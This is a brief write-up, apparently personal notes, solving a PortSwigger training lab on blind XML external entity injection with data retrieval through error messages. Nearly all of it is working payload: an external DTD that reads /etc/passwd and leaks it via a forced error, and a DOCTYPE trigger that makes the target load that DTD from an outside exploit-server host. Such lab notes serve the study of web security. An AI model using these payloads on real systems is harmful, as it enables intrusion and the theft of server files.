# Exploiting [blind XXE](https://portswigger.net/web-security/xxe/blind) to retrieve data via error messages


The trick with this lab is to define the appropriate entity to extract the contents of the file.

External DTD (exploit server):
```
<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> %eval; %error;
```

Request trigger entity:
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a53009104dc3d51822a963b01cc00c7.exploit-server.net/exploit"> %xxe;]>
```

![[exploited-2.png]]

